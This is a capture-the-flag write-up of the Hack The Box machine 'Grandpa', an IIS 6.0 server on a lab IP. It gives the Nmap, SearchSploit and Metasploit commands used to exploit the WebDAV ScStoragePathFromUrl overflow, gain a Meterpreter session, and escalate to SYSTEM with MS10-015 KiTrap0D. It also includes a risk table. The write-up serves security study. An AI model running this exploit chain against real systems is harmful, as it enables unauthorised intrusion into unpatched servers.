# Hack The Box -- Grandpa
> **Machine Name:** Grandpa  
> **Platform:** Hack The Box  
> **Difficulty:** Easy  
> **Target IP:** `10.10.10.14`  
> **Primary Service:** HTTP / Microsoft IIS 6.0  
> **Initial Access:** IIS 6.0 WebDAV buffer overflow → Meterpreter  
> **Privilege Escalation:** Local exploit → `NT AUTHORITY\SYSTEM`  
> **Final Result:** Full system compromise

---
## Execution Summary:

The attack began with **Nmap enumeration**, which identified **Microsoft IIS 6.0 on port 80** with WebDAV functionality enabled. Further vulnerability research using SearchSploit identified the **ScStoragePathFromUrl remote buffer overflow** affecting IIS 6.0.

The vulnerability was exploited through **Metasploit**, resulting in a **Meterpreter session** on the target as `NT AUTHORITY\NETWORK SERVICE`. After obtaining the initial foothold, process enumeration and migration were performed to maintain a suitable Meterpreter session.

The session was then backgrounded and **Metasploit's Local Exploit Suggester** was used to identify possible privilege-escalation vulnerabilities. The **MS10-015 (KiTrap0D)** exploit was selected and successfully executed.

A second Meterpreter session was obtained with:

```
NT AUTHORITY\SYSTEM
```

confirming **complete compromise of the Grandpa machine**.

---
## 1. Enumeration:

### Nmap:

The initial scan was performed to identify open ports and running services.

```
nmap -T4 -A -p- 10.10.10.14
```

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260812234322.png)

| Port | State | Service | Version                 |
| ---- | ----- | ------- | ----------------------- |
| 80   | open  | http    | Microsoft IIS httpd 6.0 |Nmap also identified WebDAV-related methods such as:

```
OPTIONS
TRACE
GET
HEAD
COPY
PROPFIND
SEARCH
LOCK
UNLOCK
DELETE
PUT
MOVE
```
The presence of WebDAV functionality was particularly important because IIS 6.0 has known vulnerabilities associated with its WebDAV implementation.

---
## 2. Web Enumeration:

Opening the website revealed an **“Under Construction”** IIS page.

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813002223.png)

Rather than relying only on the webpage, the IIS version was researched for known vulnerabilities.
```
ScStoragePathFromUrl remote buffer overflow.
```
[Exploit-db](https://www.exploit-db.com/exploits/41738)

---
## 3. Vulnerability Research:

SearchSploit was used to search for known vulnerabilities affecting IIS 6.0 and its WebDAV implementation.
```
searchsploit ScStoragePathFromUrl
```

The search identified the **ScStoragePathFromUrl** remote buffer overflow vulnerability.

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813002826.png)

Relevant exploits included:
```
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Overflow
```
The report identified both a Python exploit and a Ruby/Metasploit version.

---
## 4. Exploitation:

## Metasploit:

Metasploit was started and the relevant exploit was searched:

```
search ScStoragePathFromUrl
```

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813005045.png)

The identified module was:
```
exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

check the options,  the important configuration was:

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813005752.png)

set the rhost to `10.10.10.14` and the rest correct 

The available exploit target was:
```
Microsoft Windows Server 2003 R2 SP2 x86
```

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813010020.png)

The exploit was executed with:
```
run
```
The first attempt did not create a session, but a subsequent attempt successfully established a Meterpreter session, try changing the lport(5555 etc).

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813010423.png)

---
## 5. Initial Access:

After successful exploitation, a Meterpreter session was obtained on the target.

The compromised account was initially:
```
NT AUTHORITY\NETWORK SERVICE
```

The report attempted to identify suitable processes for migration using:
```
ps
```

The process list showed multiple processes running under:
```
NT AUTHORITY\NETWORK SERVICE
```

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813011148.png)

The Meterpreter session was then migrated into a suitable process:

```
migrate 1788
```

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813011326.png)

The migration completed successfully.
However, this account was **not yet SYSTEM**, so further privilege escalation was required.

---
## 6. Privilege Escalation:

The Meterpreter session was backgrounded:
```
background
```

Metasploit's local exploit suggester was then used:
```
search suggester
```

The module:
```
post/multi/recon/local_exploit_suggester
```
was selected and configured to use the existing Meterpreter session.

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813011637.png)

- set the session 1.
The suggester identified several possible local privilege-escalation exploits.

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813012143.png)

Among the results was:
```
exploit/windows/local/ms10_015_kitrap0d
```
The exploit was selected and configured to use the existing session and the attacker's interface.
got some priv esc exploits so try them one by one if any works.

---
## 7. SYSTEM Access:

The `ms10_015_kitrap0d` exploit successfully created a new Meterpreter session.

The original evidence shows:
```
Meterpreter session 2 opened
```

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813012340.png)

The system information was then checked:

```
sysinfo
```

![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813012418.png)

Finally, the current privilege level was verified:
```
getuid
```

The result was:
```
Server username: NT AUTHORITY\SYSTEM
```
This confirmed successful privilege escalation to the highest privilege level on the Windows system.

---
## 8. Attack Chain:

```
Microsoft IIS 6.0
    ↓
WebDAV enabled
    ↓
ScStoragePathFromUrl vulnerability
    ↓
Remote code execution
    ↓
Meterpreter
    ↓
NETWORK SERVICE
    ↓
Local Exploit Suggester
    ↓
MS10-015 / KiTrap0D
    ↓
NT AUTHORITY\SYSTEM
```

---
## 9. Risk Analysis:

The overall risk is **Critical** because the vulnerable IIS service allowed remote code execution, which was followed by successful local privilege escalation.

|Finding|Risk|Impact|
|---|---|---|
|Vulnerable IIS 6.0 WebDAV|**Critical**|Allowed remote exploitation and initial access.|
|Outdated Windows Server|**Critical**|Enabled known local privilege-escalation vulnerabilities.|
|Missing security patches|**Critical**|Allowed MS10-015 to escalate privileges.|

The combination of an outdated web server and an unpatched operating system allowed an attacker to progress from **remote access to complete SYSTEM-level control**.

---
## 11. Conclusion:

The Grandpa assessment demonstrated a complete compromise of a vulnerable Windows server.

The attack began by identifying **Microsoft IIS 6.0** and its exposed WebDAV functionality. Vulnerability research revealed the **ScStoragePathFromUrl remote buffer overflow**, which was successfully exploited through Metasploit to obtain a Meterpreter session as `NT AUTHORITY\NETWORK SERVICE`.

Post-exploitation enumeration identified the **MS10-015** local privilege-escalation vulnerability. Exploiting it successfully resulted in:
```
NT AUTHORITY\SYSTEM
```
Therefore, the target was fully compromised.